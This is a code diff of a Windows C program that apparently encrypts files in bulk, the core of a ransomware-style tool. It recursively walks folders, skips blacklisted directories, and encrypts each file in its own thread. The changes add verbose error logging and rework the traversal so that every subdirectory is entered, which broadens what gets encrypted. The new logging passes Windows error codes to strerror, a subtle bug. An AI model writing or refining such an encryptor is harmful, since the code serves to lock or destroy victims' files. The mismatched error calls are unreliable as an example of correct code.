@@ -88,7 +88,7 @@ void removePadding(HANDLE fileHandle) {
       for (size_t i = 0; i < paddingSize; ++i) {
         if (padding[i] != static_cast<char>(paddingSize)) {
           // invalid padding, print an error message or handle it accordingly
-          printf("invalid padding found in the file.\n");
+          printf("invalid padding found in the file: %d - %s\n", GetLastError(), strerror(GetLastError()));
           free(padding);
           return;
         }
@@ -98,13 +98,13 @@ void removePadding(HANDLE fileHandle) {
       SetEndOfFile(fileHandle);
     } else {
       // error reading the padding bytes, print an error message or handle it accordingly
-      printf("error reading padding bytes from the file.\n");
+      printf("error reading padding bytes from the file: %d - %s\n", GetLastError(), strerror(GetLastError()));
     }
 
     free(padding);
   } else {
     // invalid padding size, print an error message or handle it accordingly
-    printf("invalid padding size: %d\n", paddingSize);
+    printf("invalid padding size: %d - %d - %s\n", paddingSize, GetLastError(), strerror(GetLastError()));
   }
 }
 
@@ -113,7 +113,7 @@ void encryptFile(const char* inputFile, const char* outputFile, const unsigned c
   HANDLE ofh = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
   if (ifh == INVALID_HANDLE_VALUE || ofh == INVALID_HANDLE_VALUE) {
-    printf("error opening file.\n");
+    printf("error opening file: %s - %d - %s\n", inputFile, GetLastError(), strerror(GetLastError()));
     return;
   }
 
@@ -168,7 +168,7 @@ void encryptFiles(const char* folderPath, const BYTE* key) {
   HANDLE hFind = FindFirstFileA(searchPath, &findFileData);
 
   if (hFind == INVALID_HANDLE_VALUE) {
-    printf("error: %d\n", GetLastError());
+    printf("error: %s - %d - %s\n", folderPath, GetLastError(), strerror(GetLastError()));
     return;
   }
 
@@ -185,19 +185,19 @@ void encryptFiles(const char* folderPath, const BYTE* key) {
     char filePath[MAX_PATH];
     sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);
 
-    int isBlacklisted = 0;
-    for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
-      if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
-        isBlacklisted = 1;
-        break;
+    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+      // enumerate subdirectories
+      encryptFiles(filePath, key);
+    } else {
+      int isBlacklisted = 0;
+      for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
+        if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
+          isBlacklisted = 1;
+          break;
+        }
       }
-    }
-  
-    if (!isBlacklisted) {
-      if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-        // recursive call for subfolders
-        encryptFiles(filePath, key);
-      } else {
+    
+      if (!isBlacklisted) {
         // process individual files
         printf("file: %s\n", filePath);
         char encryptedFilePath[MAX_PATH];
@@ -207,7 +207,7 @@ void encryptFiles(const char* folderPath, const BYTE* key) {
         // Start a new thread
         threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &encryptFileThread, (void*)&threadData, 0, NULL);
         if (threadHandles[threadCount] == 0) {
-          printf("error creating thread\n");
+          printf("error creating thread: %d - %s\n", GetLastError(), strerror(GetLastError()));
           return;
         }
 
